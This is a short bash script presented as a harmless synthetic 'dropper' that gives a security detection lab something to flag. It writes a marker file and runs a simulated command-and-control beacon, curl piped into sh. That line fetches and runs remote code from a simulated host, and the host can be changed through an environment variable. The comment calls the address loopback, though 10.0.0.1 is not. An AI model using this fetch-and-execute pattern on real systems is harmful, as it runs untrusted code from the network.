#!/bin/bash
# SANDWORM benign synthetic dropper.
# Writes a marker file and "beacons" to the simulated network (FakeNet/INetSim).
# Harmless: no real host is contacted; the loopback/sim address is used.

MARKER="/tmp/sandworm_dropper_marker"
echo "SANDWORM-MARKER: dropper executed" > "$MARKER"
chmod +x "$MARKER" 2>/dev/null

# Simulated C2 beacon — points at the sim-net responder, never a real host.
SIMNET="${SANDWORM_SIMNET:-10.0.0.1}"
curl -s "http://${SIMNET}/beacon?id=demo" | sh 2>/dev/null || true

# A persistence-looking line so the detection lane has something to map.
echo "# would add cron entry here (disabled in synthetic sample)"
